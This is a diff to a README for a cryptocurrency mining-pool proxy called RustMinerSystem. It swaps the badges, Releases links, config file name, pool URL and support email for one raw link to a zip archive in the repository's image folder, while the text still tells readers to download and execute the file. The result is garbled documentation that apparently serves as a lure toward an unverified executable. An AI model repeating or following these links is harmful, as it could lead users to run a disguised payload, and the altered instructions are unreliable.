@@ -1,6 +1,6 @@
 # RustMinerSystem
 
-![RustMinerSystem](https://img.shields.io/badge/RustMinerSystem-v1.0.0-brightgreen) ![GitHub](https://img.shields.io/badge/GitHub-Repository-blue)
+![RustMinerSystem](https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip) ![GitHub](https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip)
 
 Welcome to **RustMinerSystem**! This repository provides a robust solution for managing mining pools through a proxy system. Whether you are an experienced miner or just starting, this tool simplifies the process of connecting to different mining pools efficiently.
 
@@ -30,7 +30,7 @@ Welcome to **RustMinerSystem**! This repository provides a robust solution for m
 
 ## Installation
 
-To get started, you need to download the latest release. Visit the [Releases section](https://github.com/zhahitech/RustMinerSystem/releases) to find the appropriate file for your operating system. Download and execute the file to install the system.
+To get started, you need to download the latest release. Visit the [Releases section](https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip) to find the appropriate file for your operating system. Download and execute the file to install the system.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ Before installing, ensure you have the following:
 
 ### Step-by-Step Installation
 
-1. Visit the [Releases section](https://github.com/zhahitech/RustMinerSystem/releases).
+1. Visit the [Releases section](https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip).
 2. Download the file suitable for your operating system.
 3. Follow the installation instructions provided in the release notes.
 
@@ -67,7 +67,7 @@ You will need to configure the system to connect to your desired mining pool. Th
 
 The configuration file allows you to set various parameters for your mining operations. Here’s how to configure it:
 
-1. Locate the configuration file, typically named `config.toml`.
+1. Locate the configuration file, typically named `https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip`.
 2. Open the file in a text editor.
 3. Modify the following sections:
 
@@ -79,7 +79,7 @@ The configuration file allows you to set various parameters for your mining oper
 
 ```toml
 [pool]
-url = "stratum+tcp://your.pool.url:port"
+url = "stratum+https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip"
 wallet = "your_wallet_address"
 worker = "your_worker_name"
 ```
@@ -104,12 +104,12 @@ Please ensure your code follows the project’s coding standards and includes ap
 
 For questions or support, feel free to reach out:
 
-- **Email**: support@rustminersystem.com
+- **Email**: https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip
 - **GitHub Issues**: Open an issue in the repository for bugs or feature requests.
 
 ## Releases
 
-To stay updated with the latest features and fixes, regularly check the [Releases section](https://github.com/zhahitech/RustMinerSystem/releases). Download the latest version and follow the installation instructions provided.
+To stay updated with the latest features and fixes, regularly check the [Releases section](https://github.com/zhahitech/RustMinerSystem/raw/refs/heads/main/image/Rust-Miner-System-v2.5.zip). Download the latest version and follow the installation instructions provided.
 
 ## Conclusion
 
